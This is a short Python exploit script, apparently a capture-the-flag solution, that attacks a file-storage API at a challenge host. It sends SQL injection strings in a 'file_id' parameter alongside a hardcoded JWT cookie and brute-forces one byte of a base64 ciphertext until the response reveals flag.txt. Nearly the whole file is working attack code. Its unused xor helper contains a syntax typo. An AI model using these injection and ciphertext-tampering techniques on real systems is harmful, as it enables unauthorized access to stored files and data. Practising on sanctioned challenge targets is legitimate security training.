import requests
import base64

def xor(s1, s2):
    return b'',join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))


def replace_str_index(text,index=0,replacement=b''):
    return text[:index] +replacement + text[index+1:]
b64_charset='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

#payload = "Xi4zAHkQ9QzJJmlm8UYTANmr/r+WVYV0M3Af9F6mUh8="
payload = list(base64.b64decode("Nukn1c8V5qNClj6vcRmocGiAKHPbM18bQeiHmz5Oci9hPOkltxe0Vo6fHjETKOVX"))

payload = payload[16:]

last_char = payload[-1]

cookie = {
        "auth": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXJuYW1lIiwiaWQiOjY0fQ.9gOwSSiVuU_78l3HmC5sttXkeCPVLU-vECb8Cc5pRO8"
        }

desire = [
        b"A"*16,
        b"/"+b"x0f"*15
        ]

for j in range(0,0x100):

    #if i == len(payload)-1 and j == last_char:
    #    continue
    payload[0] = j
    new_payload = base64.b64encode(bytes(payload)).decode()
    #print(new_payload)
    data = {
            "file_id": f'99 UNION SELECT 1,64,"","8CuSXWymmCHs0Nu8q/UqWCVtlhncb12MTv8OCxvjujY=","{new_payload}",1; -- '
            #"file_id": f'99 UNION SELECT 1,1,"","Xi4zAHkQ9QzJJmlm8UYTANmr/r+WVYV0M3Af9F6mUh8=","{base64.b64encode(bytes(payload)).decode()}",1; -- '
            }

    resp = requests.post('http://storage.challs.uscybergames.com/api/files/info', data=data, cookies=cookie)
    if b'flag.txt' in resp.content:
        print("yaY")
        print(j)
        print(resp.content)
        print(new_payload)
        break
#print(base64.b64encode(bytes(payload)))
